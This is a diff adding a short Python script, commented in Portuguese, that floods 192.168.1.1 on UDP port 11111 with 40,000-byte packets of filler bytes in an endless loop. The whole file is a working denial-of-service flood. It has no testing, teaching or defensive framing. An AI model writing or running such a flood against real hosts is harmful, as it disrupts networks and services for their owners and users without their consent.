@@ -1,0 +1,17 @@
+import socket
+
+# Configurações do servidor
+TARGET_IP = '192.168.1.1'
+TARGET_PORT = 11111
+BUFFER_SIZE = 40000
+
+# Criar socket UDP
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+# Dados a serem enviados
+data = b'A' * BUFFER_SIZE
+
+# Enviar pacotes em loop
+while True:
+    sock.sendto(data, (TARGET_IP, TARGET_PORT))
+
